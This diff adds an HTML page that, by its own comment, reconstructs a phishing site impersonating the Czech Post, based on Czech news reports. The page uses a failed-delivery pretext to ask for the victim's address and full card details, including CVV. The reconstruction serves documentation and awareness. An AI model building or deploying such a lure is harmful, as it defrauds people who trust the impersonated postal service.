@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="cs">
+<head>
+<meta charset="utf-8">
+<title>Česká pošta – Sledování zásilek</title>
+</head>
+<body>
+<!-- Rekonstrukce falešné stránky „České pošty“ podle popisu v článcích:
+     Novinky.cz (10. 6. 2024): „poměrně zdařilá kopie oficiálních stránek České pošty“, SMS žádá potvrzení adresy;
+     CNN Prima NEWS (12. 6. 2025): odkazy „požadují vyplnění údajů o platební kartě“, částky „udané na haléře“.
+     Samotná stránka na ceskapostacz.com.cn už neexistuje. -->
+<header><b>Česká pošta</b> <nav>Sledování zásilek · Pošty a výdejní místa · Ceník</nav></header>
+<main>
+<h1>Vaše zásilka nemohla být doručena</h1>
+<p>Balíček dorazil do skladu, ale nemohl být doručen z důvodu neúplných údajů o adrese. Potvrďte prosím svou adresu.</p>
+<form action="/cz/pay" method="post">
+<input name="jmeno" placeholder="Jméno a příjmení">
+<input name="adresa" placeholder="Ulice a číslo domu">
+<input name="psc" placeholder="PSČ a obec">
+<p>Za opětovné doručení je nutné uhradit poplatek. Platbu provedete kartou.</p>
+<input name="card_number" placeholder="Číslo karty" autocomplete="cc-number">
+<input name="expiry" placeholder="Platnost (MM/RR)">
+<input name="cvv" placeholder="CVV">
+<button>Potvrdit a zaplatit</button>
+</form>
+</main>
+<footer>© Česká pošta, s.p.</footer>
+</body>
+</html>
